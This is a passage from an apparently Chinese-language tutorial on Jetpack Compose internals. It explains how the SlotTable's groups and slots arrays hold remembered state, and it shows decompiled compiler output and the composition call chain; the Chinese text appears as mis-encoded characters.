<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">traditionalCounter</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> count = <span class="hljs-number">0</span>  <span class="hljs-comment">// æ¯æ¬¡è°ƒç”¨éƒ½ä¼šé‡æ–°åˆå§‹åŒ–ä¸º0</span>
    count++
    println(<span class="hljs-string">"Count: <span class="hljs-variable">$count</span>"</span>)
}

<span class="hljs-comment">// å¤šæ¬¡è°ƒç”¨</span>
traditionalCounter() <span class="hljs-comment">// è¾“å‡º: Count: 1</span>
traditionalCounter() <span class="hljs-comment">// è¾“å‡º: Count: 1 (çŠ¶æ€æ²¡æœ‰ä¿æŒ)</span>
</code></pre>
<h3 data-id="heading-3">2ã€2 ä¼ ç»Ÿå‡½æ•°ï¼ˆä½¿ç”¨å¤–éƒ¨å˜é‡ï¼Œä½†æ— æ³•ä¸èŠ‚ç‚¹æ ‘å…³è”ï¼‰</h3>
<p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨å¤–éƒ¨å˜é‡æ¥ä¿æŒçŠ¶æ€ï¼Œä½†å¦‚æœæœ‰å¤šä¸ªå®ä¾‹ï¼Œå®ƒä»¬ä¼šå…±äº«åŒä¸€ä¸ªçŠ¶æ€ï¼Œå¹¶ä¸”æ— æ³•ä¸ç‰¹å®šçš„UIç»„ä»¶å®ä¾‹ç»‘å®šã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">var</span> globalCount = <span class="hljs-number">0</span>

<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">traditionalCounterWithGlobal</span><span class="hljs-params">()</span></span> {
    globalCount++
    println(<span class="hljs-string">"Count: <span class="hljs-variable">$globalCount</span>"</span>)
}

<span class="hljs-comment">// å¤šæ¬¡è°ƒç”¨</span>
traditionalCounterWithGlobal() <span class="hljs-comment">// è¾“å‡º: Count: 1</span>
traditionalCounterWithGlobal() <span class="hljs-comment">// è¾“å‡º: Count: 2</span>
<span class="hljs-comment">// ä½†æ˜¯å¦‚æœæœ‰å¤šä¸ªè®¡æ•°å™¨ï¼Œå®ƒä»¬éƒ½ä¼šä¿®æ”¹åŒä¸€ä¸ªå˜é‡ï¼Œæ— æ³•ç‹¬ç«‹ã€‚</span>
</code></pre>
<h3 data-id="heading-4">2ã€3 Composeå‡½æ•°ï¼ˆä½¿ç”¨SlotTableè®°å¿†çŠ¶æ€ï¼‰ï¼š</h3>
<p>åœ¨Composeä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨<code>remember</code>æ¥å°†çŠ¶æ€ä¸è°ƒç”¨ç‚¹ï¼ˆåœ¨SlotTableä¸­çš„ä½ç½®ï¼‰å…³è”èµ·æ¥ã€‚</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ComposableCounter</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// è¿™é‡Œçš„countçŠ¶æ€ä¼šè¢«å­˜å‚¨åœ¨SlotTableä¸­ï¼Œä¸å½“å‰Composableåœ¨UIæ ‘ä¸­çš„ä½ç½®å…³è”</span>
    <span class="hljs-keyword">val</span> count <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-number">0</span>) }

    Button(onClick = { <span class="hljs-comment">/* å¦‚ä½•å¢åŠ ï¼Ÿè¿™é‡Œå…ˆä¸å†™ï¼Œä¸‹é¢è§£é‡Š */</span> }) {
        Text(<span class="hljs-string">"Count: <span class="hljs-variable">$count</span>"</span>)
    }
}
</code></pre>
<p>ä½†æ˜¯ï¼Œä¸ºäº†æ›´æ–°çŠ¶æ€ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªäº‹ä»¶ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹ï¼š</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">ComposableCounter</span><span class="hljs-params">()</span></span> {
    <span class="hljs-comment">// ä½¿ç”¨rememberå°†çŠ¶æ€å­˜å‚¨åœ¨SlotTableä¸­</span>
    <span class="hljs-keyword">val</span> count = remember { mutableStateOf(<span class="hljs-number">0</span>) }

    Button(onClick = { count.value++ }) {
        Text(<span class="hljs-string">"Count: <span class="hljs-subst">${count.value}</span>"</span>)
    }
}
</code></pre>
<p>ç°åœ¨ï¼Œå½“æˆ‘ä»¬ç‚¹å‡»æŒ‰é’®æ—¶ï¼ŒçŠ¶æ€æ”¹å˜ï¼Œè§¦å‘é‡ç»„ã€‚åœ¨é‡ç»„æ—¶ï¼Œ<code>remember</code>ä¼šä»SlotTableä¸­è¯»å–ä¹‹å‰å­˜å‚¨çš„å€¼ï¼ˆè€Œä¸æ˜¯é‡æ–°åˆå§‹åŒ–ä¸º0ï¼‰ï¼Œæ‰€ä»¥çŠ¶æ€å¾—ä»¥ä¿æŒï¼Œå¹¶ä¸”æ¯æ¬¡ç‚¹å‡»éƒ½ä¼šå¢åŠ ã€‚</p>
<p>ä¼ ç»Ÿå‡½æ•°æ²¡æœ‰"è®°å¿†"ï¼Œä½†Composeéœ€è¦ï¼š</p>
<ol>
<li><strong>è®°ä½çŠ¶æ€</strong>Â -Â <code>remember</code>çš„å€¼åœ¨é‡ç»„é—´ä¿æŒã€‚</li>
<li><strong>è®°ä½ UI ç»“æ„</strong>Â - çŸ¥é“å“ªäº›ç»„ä»¶å­˜åœ¨ï¼Œå®ƒä»¬çš„é¡ºåºã€‚</li>
<li><strong>æ¯”è¾ƒå·®å¼‚</strong>Â - é‡ç»„æ—¶çŸ¥é“ä»€ä¹ˆå˜äº†ï¼Œä»€ä¹ˆæ²¡å˜ã€‚</li>
<li><strong>é«˜æ•ˆæ›´æ–°</strong>Â - åªæ›´æ–°çœŸæ­£éœ€è¦æ›´æ–°çš„éƒ¨åˆ†ã€‚</li>
</ol>
<p><strong>SlotTableå°±æ˜¯ç”¨æ¥è§£å†³ä¸Šé¢4ä¸ªé—®é¢˜çš„ã€‚</strong></p>
<h2 data-id="heading-5">ä¸‰ã€SlotTableçš„æ•°æ®ç»“æ„</h2>
<h3 data-id="heading-6">3ã€1 åŒæ•°ç»„è®¾è®¡</h3>
<p><strong>SlotTableæœ‰ä¸¤ä¸ªæ ¸å¿ƒçš„æ•°æ®ç»“æ„ï¼Œä¸€ä¸ªæ˜¯groupsï¼Œç”¨æ¥å­˜å‚¨æ‰€æœ‰ç»„çš„å…ƒæ•°æ®ï¼Œæ˜¯ä¸€ä¸ªæ‰å¹³åŒ–çš„æ ‘ç»“æ„ã€‚å¦ä¸€ä¸ªæ˜¯slotsï¼Œç”¨æ¥å­˜å‚¨å®é™…æ•°æ®ï¼ˆStateã€LayoutNodeã€RecomposeScopeã€CompositionLocalã€rememberç­‰ï¼‰ã€‚</strong></p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// SlotTable.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SlotTable</span> : <span class="hljs-type">CompositionData</span>, <span class="hljs-type">Iterable</span>&lt;<span class="hljs-type">CompositionGroup</span>&gt; {
    <span class="hljs-comment">/**
     * groups æ•°ç»„å­˜å‚¨ç»„çš„å…ƒä¿¡æ¯
     * æ¯ä¸ªç»„å ç”¨ 5 ä¸ª Int å…ƒç´ ï¼ˆGroup_Fields_Size = 5ï¼‰
     */</span>
    <span class="hljs-keyword">var</span> groups = IntArray(<span class="hljs-number">0</span>)
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>
    
    <span class="hljs-keyword">var</span> groupsSize = <span class="hljs-number">0</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>

    <span class="hljs-comment">/**
     * slotsæ•°ç»„å­˜å‚¨å®é™…æ•°æ®
     * å¦‚ remember çš„å€¼ã€RecomposeScopeImplã€Node ç­‰
     */</span>
    <span class="hljs-keyword">var</span> slots = Array&lt;Any?&gt;(<span class="hljs-number">0</span>) { <span class="hljs-literal">null</span> }
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>
    
    <span class="hljs-keyword">var</span> slotsSize = <span class="hljs-number">0</span>
        <span class="hljs-keyword">private</span> <span class="hljs-keyword">set</span>
}
</code></pre>
<h3 data-id="heading-7">3ã€2 Groupçš„ç»“æ„</h3>
<p>æ¯ä¸ªç»„åœ¨groupsæ•°ç»„ä¸­å ç”¨5ä¸ªè¿ç»­çš„Intï¼š</p>



















<table><thead><tr><th>0</th><th>1</th><th>2</th><th>3</th><th>4</th></tr></thead><tbody><tr><td>key</td><td>groupInfo(flags)</td><td>parentAnchor</td><td>size</td><td>dataAnchor</td></tr></tbody></table>
<ul>
<li>key:          ç»„çš„å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆç”±ç¼–è¯‘å™¨ç”Ÿæˆï¼‰</li>
<li>groupInfo:    åŒ…å«å¤šå°‘ä¸ªå­èŠ‚ç‚¹å’Œä¸€äº›æ ‡å¿—ä½ï¼ˆæ˜¯å¦æ˜¯èŠ‚ç‚¹ã€æ˜¯å¦æœ‰Auxã€æ˜¯å¦æœ‰ObjectKeyç­‰ï¼‰</li>
<li>parentAnchor: çˆ¶èŠ‚ç‚¹çš„ä½ç½®ï¼ˆç”¨äºæ„å»ºæ ‘å½¢ç»“æ„ï¼‰</li>
<li>size:         ç»„çš„å¤§å°ï¼ˆåŒ…å«æ‰€æœ‰å­ç»„ï¼‰</li>
<li>dataAnchor:   æŒ‡å‘slotsæ•°ç»„ä¸­çš„ä½ç½®ï¼Œæ‰¾åˆ°è¿™ä¸ªç»„å¯¹åº”çš„å®é™…æ•°æ®ï¼ˆrememberçš„å€¼ã€èŠ‚ç‚¹å¯¹è±¡ç­‰ï¼‰</li>
</ul>
<p>GroupInfoä½å¸ƒå±€ï¼š</p>

































<table><thead><tr><th>ä½</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>30</td><td>isNode - æ˜¯å¦æ˜¯èŠ‚ç‚¹Group</td></tr><tr><td>29</td><td>hasObjectKey - æ˜¯å¦æœ‰å¯¹è±¡ç±»å‹çš„key</td></tr><tr><td>28</td><td>hasAux - æ˜¯å¦æœ‰è¾…åŠ©æ•°æ®</td></tr><tr><td>27</td><td>mark - æ ‡è®°ä½</td></tr><tr><td>26</td><td>containsMark - æ˜¯å¦åŒ…å«æ ‡è®°</td></tr><tr><td>0-25</td><td>nodeCount - èŠ‚ç‚¹è®¡æ•°</td></tr></tbody></table>
<p><strong>è¿™æ ·è®¾è®¡çš„ç›®çš„ï¼š</strong></p>
<ul>
<li><strong>æ„å»ºä¸€ä¸ªæ‰å¹³åŒ–çš„æ ‘ç»“æ„ï¼Œè®¿é—®æ›´åŠ å¿«ã€‚</strong></li>
<li><strong>ç”¨5ä¸ªIntæè¿°ä¸€ä¸ªç»„ï¼Œçœå†…å­˜ã€‚</strong></li>
<li><strong>é€šè¿‡keyåŒ¹é…ï¼Œé‡ç»„æ—¶å¯¹æ¯”æ–°æ—§çŠ¶æ€ã€‚</strong></li>
<li><strong>çŸ¥é“çˆ¶èŠ‚ç‚¹çš„ä½ç½®å’Œç»„çš„å¤§å°ï¼Œå¯ä»¥å¿«é€Ÿçš„æ‰¾åˆ°ä¸‹ä¸€ä¸ªç»„nextGroup = currentGroup + sizeï¼Œä¹Ÿå¯ä»¥å¿«é€Ÿçš„æ‰¾åˆ°ä¸‹ä¸€ä¸ªçˆ¶èŠ‚ç‚¹ï¼šparent = groups[currentGroup * 5 + 2]</strong></li>
</ul>
<p><strong>è¯·ç‰¢è®°ï¼Œgroupsæ•°ç»„çš„ç»“æ„ã€slotsæ•°ç»„çš„ç»“æ„ä»¥åŠè¿™æ ·è®¾è®¡çš„ç›®çš„ã€‚</strong></p>
<h3 data-id="heading-8">3ã€3 æ•°æ®å¸ƒå±€ç¤ºä¾‹</h3>
<p>å‡è®¾æœ‰å¦‚ä¸‹Composeå‡½æ•°</p>
<pre><code class="hljs language-kotlin" lang="kotlin">
<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">App</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> show <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">true</span>) }
    
    Column {
        Text(<span class="hljs-string">"Hello"</span>)
    }
}
</code></pre>
<p>SlotTableå¸ƒå±€ï¼š</p>
<p>groupsæ•°ç»„å°±ä¼šå˜æˆè¿™æ ·(æ¯5ä¸ªIntä¸ºä¸€ç»„):</p>









<table><thead><tr><th>Appç»„å…ƒä¿¡æ¯ ( 5ä¸ªint)</th><th>rememberç»„ (5ä¸ªint)</th><th>Columnç»„ (5ä¸ªint)</th><th>Textç»„ (5ä¸ªint)</th></tr></thead></table>
<p>slotsæ•°ç»„å°±ä¼šå˜æˆè¿™æ ·:</p>









<table><thead><tr><th>Appçš„RecomposeScope</th><th>MutableState(true)</th><th>Columnçš„Node</th><th>"Hello"å­—ç¬¦ä¸²</th></tr></thead></table>
<p><strong>æ¥ä¸‹æ¥ç”¨ä¸€ä¸ªComposeå‡½æ•°ï¼Œæ·±å…¥æºç ï¼Œå»çœ‹ä¸‹groupsæ•°ç»„å’Œslotsæ•°ç»„æ˜¯å¦‚ä½•å¡«å……æ•°æ®çš„ã€‚</strong></p>
<h2 data-id="heading-9">å››ã€æºä»£ç ä¸ç¼–è¯‘å™¨è¾“å‡º</h2>
<p>ç»å…¸çš„è®¡æ•°å™¨ç´¯åŠ ä¾‹å­</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MainActivity</span> : <span class="hljs-type">ComponentActivity</span>() {
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onCreate</span><span class="hljs-params">(savedInstanceState: <span class="hljs-type">Bundle</span>?)</span></span> {
        enableEdgeToEdge()
        <span class="hljs-keyword">super</span>.onCreate(savedInstanceState)
        setContent {
            Count()
        }
    }
}

<span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">Count</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> content <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-number">0</span>) }
    
    Button({
        content++
    }, content = {
        Text(content.toString())
    })
}
</code></pre>
<p><strong>ç¼–è¯‘åCountå‡½æ•°å˜æˆäº†ä¸‹é¢çš„ä»£ç ï¼ŒCountå‡½æ•°æœ¬æ¥æ²¡æœ‰å‚æ•°ï¼Œç¼–è¯‘åCountå‡½æ•°å´æœ‰ä¸¤ä¸ªå‚æ•°ã€‚</strong></p>
<pre><code class="hljs language-Java" lang="Java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Count</span><span class="hljs-params">(<span class="hljs-meta">@Nullable</span> Composer $composer, <span class="hljs-type">int</span> $changed)</span> {
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤1: å¯åŠ¨ RestartGroup</span>
    <span class="hljs-comment">// startRestartGroup ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ Group å¹¶è®°å½• RecomposeScope</span>
    <span class="hljs-comment">// key = -1491082337 æ˜¯ç¼–è¯‘å™¨ä¸º Count å‡½æ•°ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†</span>
    <span class="hljs-comment">// ============================================================</span>
    $composer = $composer.startRestartGroup(-<span class="hljs-number">1491082337</span>);
    
    <span class="hljs-comment">// è®°å½•æºä»£ç ä½ç½®ä¿¡æ¯ï¼ˆç”¨äºè°ƒè¯•å’Œå·¥å…·ï¼‰</span>
    ComposerKt.sourceInformation($composer, <span class="hljs-string">"C(Count)20@464L30,24@544L40,22@500L85:Demo.kt#bw2bq5"</span>);
    
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤2: è·³è¿‡æ£€æŸ¥</span>
    <span class="hljs-comment">// å¦‚æœ $changed == 0 ä¸”å¯ä»¥è·³è¿‡ï¼Œåˆ™è·³è¿‡æ•´ä¸ªç»„åˆ</span>
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-keyword">if</span> ($changed == <span class="hljs-number">0</span> &amp;&amp; $composer.getSkipping()) {
        $composer.skipToGroupEnd();
    } <span class="hljs-keyword">else</span> {
        <span class="hljs-comment">// å¼€å§‹è·Ÿè¸ªï¼ˆç”¨äºæ€§èƒ½åˆ†æï¼‰</span>
        <span class="hljs-keyword">if</span> (ComposerKt.isTraceInProgress()) {
            ComposerKt.traceEventStart(-<span class="hljs-number">1491082337</span>, $changed, -<span class="hljs-number">1</span>, <span class="hljs-string">"com.example.kmp.Count (Demo.kt:18)"</span>);
        }

        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤3: remember å— - åˆ›å»ºå¹¶ç¼“å­˜ MutableState</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">$i$f$remember</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// sourceInformationMarkerStart ä¸åˆ›å»º Groupï¼Œåªæ˜¯æ ‡è®°æºä»£ç ä½ç½®</span>
        ComposerKt.sourceInformationMarkerStart($composer, -<span class="hljs-number">492369756</span>, <span class="hljs-string">"CC(remember)N(calculation):Composables.kt#9igjgp"</span>);
        
        <span class="hljs-type">boolean</span> <span class="hljs-variable">invalid$iv$iv</span> <span class="hljs-operator">=</span> (<span class="hljs-type">boolean</span>)<span class="hljs-number">0</span>;
        <span class="hljs-type">int</span> <span class="hljs-variable">$i$f$cache</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤4: è¯»å–å·²ç¼“å­˜çš„å€¼</span>
        <span class="hljs-comment">// rememberedValue() ä»å½“å‰ slot è¯»å–ä¹‹å‰å­˜å‚¨çš„å€¼</span>
        <span class="hljs-comment">// å¦‚æœæ˜¯é¦–æ¬¡ç»„åˆï¼Œè¿”å› Composer.Empty</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-type">Object</span> <span class="hljs-variable">it$iv$iv</span> <span class="hljs-operator">=</span> $composer.rememberedValue();
        
        <span class="hljs-type">int</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        Object var10000;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤5: åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ›å»ºæ–°å€¼</span>
        <span class="hljs-comment">// å¦‚æœè¯»å–åˆ° Emptyï¼Œè¯´æ˜æ˜¯é¦–æ¬¡ç»„åˆï¼Œéœ€è¦åˆ›å»ºæ–°çš„ MutableState</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-keyword">if</span> (it$iv$iv == Composer.Companion.getEmpty()) {
            <span class="hljs-type">int</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
            <span class="hljs-comment">// åˆ›å»º MutableState&lt;Int&gt;ï¼Œåˆå§‹å€¼ä¸º 0</span>
            <span class="hljs-type">Object</span> <span class="hljs-variable">value$iv$iv</span> <span class="hljs-operator">=</span> SnapshotStateKt.mutableStateOf$<span class="hljs-keyword">default</span>(<span class="hljs-number">0</span>, (SnapshotMutationPolicy)<span class="hljs-literal">null</span>, <span class="hljs-number">2</span>, (Object)<span class="hljs-literal">null</span>);
            <span class="hljs-comment">// å°†æ–°åˆ›å»ºçš„å€¼å­˜å‚¨åˆ° slot</span>
            $composer.updateRememberedValue(value$iv$iv);
            var10000 = value$iv$iv;
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-comment">// é‡ç»„æ—¶ç›´æ¥ä½¿ç”¨ç¼“å­˜çš„å€¼</span>
            var10000 = it$iv$iv;
        }

        <span class="hljs-type">Object</span> <span class="hljs-variable">var11</span> <span class="hljs-operator">=</span> var10000;
        ComposerKt.sourceInformationMarkerEnd($composer);
        
        <span class="hljs-comment">// content$delegate å°±æ˜¯ remember { mutableStateOf(0) } çš„ç»“æœ</span>
        <span class="hljs-keyword">final</span> <span class="hljs-type">MutableState</span> <span class="hljs-variable">content$delegate</span> <span class="hljs-operator">=</span> (MutableState)var11;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤6: ä¸º onClick lambda åˆ›å»º ReplaceGroup</span>
        <span class="hljs-comment">// startReplaceGroup åˆ›å»ºä¸€ä¸ªå¯æ›¿æ¢çš„ Group</span>
        <span class="hljs-comment">// key = -548075111 æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„å”¯ä¸€æ ‡è¯†</span>
        <span class="hljs-comment">// ============================================================</span>
        $composer.startReplaceGroup(-<span class="hljs-number">548075111</span>);
        
        <span class="hljs-comment">// æ£€æŸ¥ content$delegate æ˜¯å¦å‘ç”Ÿå˜åŒ–</span>
        <span class="hljs-type">boolean</span> <span class="hljs-variable">$this$cache$iv$iv</span> <span class="hljs-operator">=</span> $composer.changed(content$delegate);
        
        invalid$iv$iv = (<span class="hljs-type">boolean</span>)<span class="hljs-number">0</span>;
        <span class="hljs-type">Object</span> <span class="hljs-variable">it$iv</span> <span class="hljs-operator">=</span> $composer.rememberedValue();
        <span class="hljs-type">int</span> <span class="hljs-variable">var16</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤7: ç¼“å­˜ onClick lambda</span>
        <span class="hljs-comment">// å¦‚æœä¾èµ–æ²¡å˜ä¸”ä¹‹å‰æœ‰ç¼“å­˜ï¼Œä½¿ç”¨ç¼“å­˜çš„ lambda</span>
        <span class="hljs-comment">// å¦åˆ™åˆ›å»ºæ–°çš„ lambda å¹¶ç¼“å­˜</span>
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-keyword">if</span> (!$<span class="hljs-built_in">this</span>$cache$iv$iv &amp;&amp; it$iv != Composer.Companion.getEmpty()) {
            var10000 = it$iv;
        } <span class="hljs-keyword">else</span> {
            var9 = <span class="hljs-number">0</span>;
            <span class="hljs-comment">// DemoKt::Count$lambda$4$lambda$3 æ˜¯ç¼–è¯‘å™¨ç”Ÿæˆçš„ lambda å¼•ç”¨</span>
            <span class="hljs-type">Object</span> <span class="hljs-variable">value$iv</span> <span class="hljs-operator">=</span> DemoKt::Count$lambda$<span class="hljs-number">4</span>$lambda$<span class="hljs-number">3</span>;
            $composer.updateRememberedValue(value$iv);
            var10000 = value$iv;
        }

        <span class="hljs-type">Function0</span> <span class="hljs-variable">var13</span> <span class="hljs-operator">=</span> (Function0)var10000;
        
        <span class="hljs-comment">// ç»“æŸ ReplaceGroup</span>
        $composer.endReplaceGroup();
        
        <span class="hljs-comment">// ============================================================</span>
        <span class="hljs-comment">// æ­¥éª¤8: è°ƒç”¨ Button Composable</span>
        <span class="hljs-comment">// Button å†…éƒ¨ä¼šåˆ›å»ºè‡ªå·±çš„ Groups</span>
        <span class="hljs-comment">// æœ€åä¸€ä¸ªå‚æ•°æ˜¯ content lambdaï¼Œä½¿ç”¨ rememberComposableLambda åŒ…è£…</span>
        <span class="hljs-comment">// ============================================================</span>
        ButtonKt.Button(
            var13,                    <span class="hljs-comment">// onClick</span>
            (Modifier)<span class="hljs-literal">null</span>,           <span class="hljs-comment">// modifier</span>
            <span class="hljs-literal">false</span>,                    <span class="hljs-comment">// enabled</span>
            (Shape)<span class="hljs-literal">null</span>,              <span class="hljs-comment">// shape</span>
            (ButtonColors)<span class="hljs-literal">null</span>,       <span class="hljs-comment">// colors</span>
            (ButtonElevation)<span class="hljs-literal">null</span>,    <span class="hljs-comment">// elevation</span>
            (BorderStroke)<span class="hljs-literal">null</span>,       <span class="hljs-comment">// border</span>
            (PaddingValues)<span class="hljs-literal">null</span>,      <span class="hljs-comment">// contentPadding</span>
            (MutableInteractionSource)<span class="hljs-literal">null</span>, <span class="hljs-comment">// interactionSource</span>
            <span class="hljs-comment">// content lambda - ä½¿ç”¨ rememberComposableLambda ç¼“å­˜</span>
            (Function3)ComposableLambdaKt.rememberComposableLambda(
                <span class="hljs-number">1836707247</span>,           <span class="hljs-comment">// key</span>
                <span class="hljs-literal">true</span>,                 <span class="hljs-comment">// tracked</span>
                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Function3</span>() {     <span class="hljs-comment">// lambda å®ç°</span>
                    <span class="hljs-meta">@Composable</span>
                    <span class="hljs-keyword">public</span> <span class="hljs-keyword">final</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">invoke</span><span class="hljs-params">(RowScope $<span class="hljs-built_in">this</span>$Button, Composer $composer, <span class="hljs-type">int</span> $changed)</span> {
                        <span class="hljs-comment">// ... Text(content.toString()) ...</span>
                    }
                    <span class="hljs-comment">// ...</span>
                },
                $composer,
                <span class="hljs-number">54</span>
            ),
            $composer,
            <span class="hljs-number">805306368</span>,               <span class="hljs-comment">// $changed</span>
            <span class="hljs-number">510</span>                      <span class="hljs-comment">// $default</span>
        );
        
        <span class="hljs-keyword">if</span> (ComposerKt.isTraceInProgress()) {
            ComposerKt.traceEventEnd();
        }
    }

    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-comment">// æ­¥éª¤9: ç»“æŸ RestartGroup å¹¶æ³¨å†Œé‡ç»„å›è°ƒ</span>
    <span class="hljs-comment">// endRestartGroup è¿”å› ScopeUpdateScopeï¼Œç”¨äºæ³¨å†Œé‡ç»„ lambda</span>
    <span class="hljs-comment">// ============================================================</span>
    <span class="hljs-type">ScopeUpdateScope</span> <span class="hljs-variable">var21</span> <span class="hljs-operator">=</span> $composer.endRestartGroup();
    <span class="hljs-keyword">if</span> (var21 != <span class="hljs-literal">null</span>) {
        <span class="hljs-comment">// æ³¨å†Œé‡ç»„å›è°ƒï¼šå½“éœ€è¦é‡ç»„æ—¶ï¼Œè°ƒç”¨ Count$lambda$5</span>
        var21.updateScope(DemoKt::Count$lambda$<span class="hljs-number">5</span>);
    }
}

<span class="hljs-comment">// é‡ç»„æ—¶è°ƒç”¨çš„ lambda</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Unit Count$lambda$<span class="hljs-number">5</span>(<span class="hljs-type">int</span> $$changed, Composer $composer, <span class="hljs-type">int</span> $force) {
    Count($composer, RecomposeScopeImplKt.updateChangedFlags($$changed | <span class="hljs-number">1</span>));
    <span class="hljs-keyword">return</span> Unit.INSTANCE;
}
</code></pre>
<p>Countå‡½æ•°åœ¨è°ƒç”¨ä¹‹å‰ï¼Œç»å†äº†ä¸€ç³»åˆ—çš„å‡½æ•°è°ƒç”¨ï¼Œä¸‹é¢æ˜¯è°ƒç”¨é“¾ã€‚</p>
<pre><code class="hljs language-scss" lang="scss">setContent { <span class="hljs-built_in">Count</span>() }
    â†“
ComponentActivity<span class="hljs-selector-class">.setContent</span>                    <span class="hljs-comment">// ComponentActivity.kt    </span>
    â†“
ComposeView<span class="hljs-selector-class">.setContent</span>                          <span class="hljs-comment">// ComposeView.kt    </span>
    â†“
ComposeView<span class="hljs-selector-class">.createComposition</span>                   <span class="hljs-comment">// ComposeView.kt    </span>
    â†“
ComposeView<span class="hljs-selector-class">.ensureCompositionCreated</span>            <span class="hljs-comment">// ComposeView.kt    </span>
    â†“
AbstractComposeView<span class="hljs-selector-class">.setContent</span>                  <span class="hljs-comment">// Wrapper_android.kt             </span>
    â†“
AbstractComposeView<span class="hljs-selector-class">.doSetContent</span>                <span class="hljs-comment">// Wrapper_android.kt    </span>
    â†“
WrappedComposition<span class="hljs-selector-class">.setContent</span>                   <span class="hljs-comment">// WrappedComposition.kt    </span>
    â†“
CompositionImpl<span class="hljs-selector-class">.setContent</span>()                    <span class="hljs-comment">// Composition.kt</span>
    â†“
CompositionImpl<span class="hljs-selector-class">.composeInitial</span>()                <span class="hljs-comment">// Composition.kt</span>
    â†“
Recomposer<span class="hljs-selector-class">.composeInitial</span>()                     <span class="hljs-comment">// Recomposer.kt</span>
    â†“
Recomposer<span class="hljs-selector-class">.composing</span>()                          <span class="hljs-comment">// Recomposer.kt</span>
    â†“
composition<span class="hljs-selector-class">.composeContent</span>(content)             <span class="hljs-comment">// Composition.kt</span>
    â†“
ComposerImpl<span class="hljs-selector-class">.composeContent</span>()                   <span class="hljs-comment">// Composer.kt</span>
    â†“
ComposerImpl<span class="hljs-selector-class">.composeContent</span>(invalidations, content) <span class="hljs-comment">// Composer.kt</span>
    â†“
ComposerImpl<span class="hljs-selector-class">.doCompose</span>(invalidations, content)      <span class="hljs-comment">// Composer.kt</span>
    â†“
<span class="hljs-built_in">startRoot</span>()                                     <span class="hljs-comment">// åˆ›å»ºRoot Group</span>
    â†“
<span class="hljs-built_in">startGroup</span>(invocationKey, invocation)           <span class="hljs-comment">// åˆ›å»º Invocation Group</span>
    â†“
<span class="hljs-built_in">invokeComposable</span>(this, content)                 <span class="hljs-comment">// è°ƒç”¨ç”¨æˆ·çš„ Composableï¼ˆå¦‚ Countï¼‰</span>
    â†“
